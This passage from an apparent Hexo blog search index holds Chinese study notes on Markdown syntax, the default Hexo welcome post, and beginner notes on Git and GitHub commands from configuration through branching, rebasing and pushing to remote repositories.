使用数字加点1. 1. Bird 2. Magic ## 注释块 * A list item with a blockquote: &gt; This is a blockquote &gt; inside a list item. ## 代码块 * A list item with a codeblock: def func(): print(&quot;hello Python!&quot;) ## 水平线 用三个连着的字符(字符中间有空格不要紧，-，*，_) - - - _ _ ___ * * * # 内联元素 ## 内联链接 **中括号加括号\[]()** 如:\[miracle778&apos;s Blog](https://miracle778.github.io) 显示如下 [miracle778&apos;s Blog](https://miracle778.github.io) ## 引用链接 **两个中括号[ ][ ]** This is [an example] [id] reference-style link. &lt;!-- 引用链接时，声明需隔开一行 --&gt; [id]: http://example.com/ &quot;鼠标悬浮在id上显示的文字&quot; ## 默认链接 [google][] [google]:http://google.com ## 强调 **上面比较html跟md的时候有提到** 用单\*或单\_表示斜体，与&amp;lt;em&gt;标签类似 用双\*或双\_表示粗体,与&amp;lt;strong&gt;标签类似 ## 代码 用 单\`或三\`，三`可以指定代码语言,如下 1echo "hello bash"; 1echo "hello php"; ## 图片 ### 内联图片 语法:!\[文件名](路径 &quot;可选项:表示鼠标悬停显示信息&quot;)如: ![米兔](../images/markdown-study/米兔.jpg &quot;米兔&quot;) ### 引用图片 语法:!\[文件名]\[id] ![米兔][miracle] [miracle]: ../images/markdown-study/米兔.jpg &quot;可选项:鼠标悬停显示信息&quot; # 其他 ## 自动链接 语法:&amp;lt;url&amp;gt; &lt;http://miracle778.github.com&gt; ## 反斜杠转义 **常识，不写了** 总结markdown还是容易学的，几个小时就能搞懂。但在把文章部署到hexo上时，出现了点问题。原因是VScode的Markdown Preview Enhanced插件预览的效果跟实际发布的效果有点不同。vscode里加div这种标签预览可以正常显示，而发布后不能，搞得我微调了好久，还有就是引用资源的路径，插入图片需要配置一下。还好，都是一些小问题，以后多写写，养成习惯就好。]]></content>
      <categories>
        <category>Study</category>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>study note</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2Fhello%2Fhello-world.html</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
      <categories>
        <category>hello</category>
      </categories>
      <tags>
        <tag>Hello</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github入门与实践学习笔记]]></title>
    <url>%2FStudy%2Fgit%2Fgit-study.html</url>
    <content type="text"><![CDATA[这篇学习笔记是之前发在wordpress上的，现在迁移过来了。介绍了一些git的使用，其实写的很辣鸡，但毕竟当初也是认真写的，所以直接迁过来了。 学习github，找了本书《github入门与实践》，想着做点笔记。这本书目前看着还是很舒服的，把命令记一记，先贴个书的pdf链接 https://pan.baidu.com/s/1oayFJbXvu2ZhoGmCtn82wg 密码：baua 只是自己的笔记，写的时候可能只顾让自己看懂，如果别人也在学这本书的话，可以看看2333 第一章介绍了下github是什么，git与github的区别，没什么写的。 第二章讲了安装git，按照书上写的安装完git后，然后初始化git，设置一下使用git时的姓名和邮件地址，名字注意用英文输入 $git config –global user.name “Firstname Lastname”//你的用户名$git config –global user.email “your_email@example.com“//你的邮件地址$git config –global color.ui auto$git config –global core.autocrlf false 设置完之后用cat ~/.gitconfig查看，书上是写~/.gitconfig ，但是由于查看时.gitconfig不是可执行文件，所以要改成cat ~/.gitconfig 第三章第三章名字叫使用github的前期准备，所以就是一些准备工作 创建github账户，浏览器打开http://github.com/join 填写完自己的信息之后完成创建，创建完之后按照他的guide，新建hello-world项目。 设置SSH Key $ssh-keygen -t rsa -C “your_email@example.com“输入完命令之后可以在本地文件夹找到私钥：id_rsa和公钥id_rsa.pub 添加公开密钥：按照书上添加即可 用私钥连接github $ssh -T git@github.com 公开代码 clone已有仓库 $git clone git@github.com:xxxx/xxxx.git //仓库路径去github上找 克隆下来之后就可以在本地文件夹中找到以克隆仓库为名的文件夹，在这个文件夹中可以放入想要同步到github上的文件，比如写一个hello_world.php文件放入 用命令$git status查看刚刚放入的文件，由于hello-world.php文件还没有添加至git仓库，所以显示为Untracked files 将hello-world.php文件提交至仓库 $git add hello-world.php //git add命令将文件加入暂存区(缓存区) $git commit -m “Add hello world script by php” //git commit命令将文件提交到本地仓库 $git push //git push命令将本地参库修改同步至服务器仓库 $git log //git log命令查看提交日志 先写这么一点开个头，待更…2018/03/15 21:00更 第四章通过实际操作学习Git，这章主要讲Git一些常用操作，基本熟练了这一章的话，日常使用GitHub应该没问题，我也打算先学到这里，先把github作为一个仓库使使，日后按需学习2333… $git init—初始化仓库 直接上命令吧，详细的解释实在不记得可以翻书嘛1.先在本地建立一个目录作为仓库并初始化$mkdir d:/Github/git-tutorial //mkdir是linux命令，建立文件夹，因为书上用的是Git bash(linux环境)$cd git-tutorial //cd 命令切换目录，cd或cd ~是切换到主目录（home），cd ..是返回上一级，cd ../..是返回上两级，cd 指定路径$git init //进入到git-tutorial目录后，执行git init对仓库初始化，生成.git目录， .git 目录里存储着管理当前目录内容所需的仓库数据到这就初始化成功了，提示：如果再按着书操作的时候某一步操作错了不知道怎么修改的话，可以切换到git-tutorial的上一级目录，然后执行$rm -rf git-tutorial删除这个目录重新来过（为了更快熟悉这些指令(其实是自己输命令测试),我删了好几次…） $touch README.md //创建README.md文件 $vim README.md //用vim编辑README.md(vim是真的好用), vim打开后按i进入插入模式编辑，添加内容后按esc退出编辑模 式，输入:wq保存并退出 $git status //显示仓库的状态 $git add README.md //README.md编辑好之后，$git add README.md将它添加至暂存区（暂存区的文件才可以提交） $git commit -m “First commit” //git commit命令可以将当前暂存区中的文件实际保存到仓库的历史记录中。通过这些记录，我们就可以在工作树中复原文件，-m 参数后的 “First commit”称作提交信息，是对这个提交的概述，如果想详细描述的话用$git commit命令 $git log //通过$git commit提交之后，可以通过git log命令查看提交记录及该记录的其他信息，如这个命令的哈希值 $git diff 和$git diff HEAD //git diff是查看当前工作树与暂存区的差别，git diff HEAD是查看工作树与最新提交的区别 $git branch//查看当前所在分支 $git branch feature-A//建立一个新分支 $git checkout feature-A//切换到指定分支 $git checkout -b feature-A//创建一个新分支并切换到 feature-A 分支的更改不会影响到master 分支，这正是在开发中创建分支的优点。只要创建多个分支，就可以在不互相影响的情况下同时进行多个功能的开发。 $git merge –no-ff feature-A//合并分支，千万注意先切换回master分支再进行合并，为了在历史记录中明确记录下本次分支合并，我们需要创建合并提交。因此，在合并时加上 –no-ff参数 $git log –graph //git log –graph命令可以用图表形式输出提交日志，非常直观 $git reset –hard 哈希值（通过git log查看）// git reset——回溯历史版本，所有文件都回溯到了指定哈希值对应的时间点上。也要注意在master分支下操作 $git reflog //git log命令只能查看以当前状态为终点的历史日志。所以这里要使用 git reflog命令，查看当前仓库的操作日志。在日志中找出回溯历史之前的哈希值，通过 git reset –hard命令恢复到回溯历史前的状态。 $ git commit – amend——修改提交信息，提交日志中的相应内容也会被修改。 $git rebase -i //在合并特性分支之前，如果发现已提交的内容中有些许拼写错误等，不妨提交一个修改，然后将这个修改包含到前一个提交之中，压缩成一个历史记录。 $git rebase -i HEAD~2 //用上述方式执行 git rebase命令，可以选定当前分支中包含HEAD（最新提交）在内的两个最新历史记录为对象，并在编辑器中打开。 用fixup替换pick，可以将提交历史压缩。 在本地仓库操作完之后，接下来就可以推送至远程仓库了。 在Github上新建一个仓库，注意不要选择Initialize this repository with a README （自动生成README.md文件）选项，因为本地仓库自己生成了。然后上命令 $git remote add origin git@github.com:你的用户名/git-tutorial.git //在 GitHub 上创建的仓库路径为“git@github.com:用户名 /git-tutorial.git”。现在我们用 git remote add命令将它设置成本地仓库的远程仓库。按照上述格式执行 git remote add命令之后，Git 会自动将git@github.com:用户名/git-tutorial.git远程仓库的名称设置为 origin（标识符）。 $git remote remove origin //移除与远程仓库的关联 $git push -u origin master //在master分支进行该操作，像这样执行 git push命令，当前分支的内容就会被推送给远程仓库origin 的 master分支。-u参数可以在推送的同时，将origin仓库的master分支设置为本地仓库当前分支的 upstream（上游）。添加了这个参数，将来运行 git pull命令从远程仓库获取内容时，本地仓库的这个分支就可以直接从 origin 的 master 分支获取内容，省去了另外添加参数的麻烦（其实这段话只懂个大概2333，所以就照着用就好吧）。执行该操作后，当前本地仓库 master 分支的内容将会被推送到GitHub 的远程仓库中。在 GitHub 上也可以确认远程 master 分支的内容，和本地 master 分支相同。 $ git push -u origin feature-D(其他分支名) //除了 master 分支之外，远程仓库也可以创建其他分支。 从远程仓库获取 上一节中我们把在 GitHub 上新建的仓库设置成了远程仓库，并向这个仓库 push 了 feature-D 分支。现在，所有能够访问这个远程仓库的人都可以获取 feature-D 分支并加以修改。本节中我们从实际开发者的角度出发，在另一个目录下新建一个本地仓库，学习从远程仓库获取内容的相关操作。这就相当于我们刚刚执行过 push 操作的目标仓库又有了另一名新开发者来共同开发。 $ git clone git@github.com:用户名/git-tutorial.git // git clone——获取远程仓库 ，注意不要与之前操作的同名仓库在同一目录下 执行 git clone命令后我们会默认处于 master 分支下，同时系统会自动将 origin 设置成该远程仓库的标识符。也就是说，当前本地仓库的 master 分支与 GitHub 端远程仓库（origin）的 master 分支在内容上是完全相同的。 $git branch -a //用 git branch -a命令查看当前分支的相关信息。添加 -a参数可以同时显示本地仓库和远程仓库的分支信息。 $git checkout -b feature-D origin/feature-D //我们试着将 feature-D 分支获取至本地仓库 b 参数的后面是本地仓库中新建分支的名称。为了便于理解，我们仍将其命名为 feature-D，让它与远程仓库的对应分支保持同名。新建分支名称后面是获取来源的分支名称。例子中指定了 origin/feature-D，就是说以名为 origin 的仓库（这里指 GitHub 端的仓库）的 feature-D 分支为来源，在本地仓库中创建 feature-D 分支。 现在假定我们是另一名开发者，我们可以对feature-D仓库进行修改提交，完善之后通过 $git push将修改同步到Github上去。从远程仓库获取 feature-D 分支，在本地仓库中提交更改，再将feature-D 分支推送回远程仓库，通过这一系列操作，就可以与其他开发者相互合作，共同培育 feature-D 分支，实现某些功能。 $ git pull origin feature-D //获取最新的远程仓库分支 GitHub 端远程仓库中的 feature-D 分支是最新状态，如果本地仓库没有更新的话，可以通过git pull origin feature-D更新。今后只需要像平常一样在本地进行提交再 push 给远程仓库，就可以与其他开发者同时在同一个分支中进行作业，不断给 feature-D 增加新功能。如果两人同时修改了同一部分的源代码，push 时就很容易发生冲突。所以多名开发者在同一个分支中进行作业时，为减少冲突情况的发生，建议更频繁地进行 push 和 pull 操作。 就写到这里把，留个笔记，以后用来查询]]></content>
      <categories>
        <category>Study</category>
        <category>git</category>
      </categories>
      <tags>
        <tag>git learning notes</tag>
      </tags>
  </entry>
</search>
